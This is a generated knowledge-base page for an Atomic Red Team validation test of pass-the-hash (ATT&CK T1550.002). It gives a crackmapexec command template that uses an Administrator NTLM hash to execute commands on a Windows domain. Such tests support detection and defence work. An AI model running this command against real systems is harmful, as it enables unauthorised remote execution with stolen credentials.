---
atomic_guid: "eb05b028-16c8-4ad8-adea-6f5b219da9a9"
title: "crackmapexec Pass the Hash"
framework: "atomic"
generated: "true"
attack_technique_id: "T1550.002"
attack_technique_name: "Use Alternate Authentication Material: Pass the Hash"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "eb05b028-16c8-4ad8-adea-6f5b219da9a9"
  - "crackmapexec Pass the Hash"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# crackmapexec Pass the Hash

command execute with crackmapexec

## Metadata

- Atomic GUID: eb05b028-16c8-4ad8-adea-6f5b219da9a9
- Technique: T1550.002: Use Alternate Authentication Material: Pass the Hash
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1550.002/T1550.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1550-use_alternate_authentication_material|T1550.002]]

## Input Arguments

### command

- description: command to execute
- type: string
- default: whoami

### crackmapexec_exe

- description: crackmapexec windows executable
- type: path
- default: C:\CrackMapExecWin\crackmapexec.exe

### domain

- description: domain
- type: string
- default: %userdnsdomain%

### ntlm

- description: command
- type: string
- default: cc36cf7a8514893efccd3324464tkg1a

### user_name

- description: username
- type: string
- default: Administrator

## Dependencies

CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})

### Prerequisite Check

```text
if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}
```

## Executor

- name: command_prompt

### Command

```commandprompt
#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml)
